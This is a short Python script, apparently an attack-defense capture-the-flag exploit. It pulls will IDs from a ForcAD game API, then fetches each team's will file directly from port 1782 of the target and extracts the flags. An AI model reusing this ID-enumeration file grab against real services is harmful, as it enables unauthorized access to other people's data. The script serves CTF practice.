import requests
import checklib
import sys
import json
import re

regex = re.compile('[A-Z0-9]{31}=')

ip = sys.argv[1]
forcad_ip = '127.0.0.1'

def get_attack_data():
    data = requests.get(f"http://{forcad_ip}/api/client/attack_data").text
    data = json.loads(data)['zaveschalka'][ip]

    will_ids = []
    for attack in data:
        will_ids.append(json.loads(attack)["will_id"])

    return will_ids

def get_flags(will_ids: list[str]):
    for will_id in will_ids:
        req = requests.get(f"http://{ip}:1782/wills/{will_id}.txt")
        print(regex.findall(req.text)[0])

will_ids = get_attack_data()

get_flags(will_ids)